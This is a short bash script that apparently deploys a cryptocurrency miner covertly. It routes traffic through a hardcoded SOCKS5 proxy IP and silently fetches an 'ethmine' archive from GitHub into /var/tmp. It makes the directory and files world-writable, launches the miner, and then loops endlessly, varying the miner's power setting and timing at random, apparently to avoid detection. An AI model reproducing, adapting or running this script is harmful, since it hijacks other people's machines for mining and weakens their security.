#!/bin/bash
export http_proxy=socks5://52.90.238.168:1080
https_proxy=socks5://52.90.238.168:1080
curl -o /var/tmp/eth -L https://github.com/superalix/avian/raw/main/ethmine.tar.gz  > /dev/null 2>&1
chmod 777 /var/tmp
cd /var/tmp
tar -xvf eth
t_min=45
t_max=120
cpu_min=10
cpu_max=60
chmod 777 mine.sh
chmod 777 Mine
chmod 777 config.txt
./Mine -config config.txt
while true :
  do
    t=$(($t_min + $RANDOM % ($t_max - $t_min)))
    cpu=$(($cpu_max + $t * ($cpu_min - $cpu_max)/($t_max - $t_min)))
    echo $cpu
    sed -i "6s/.*/-gpow ${cpu}/" config.txt
    sleep $t
done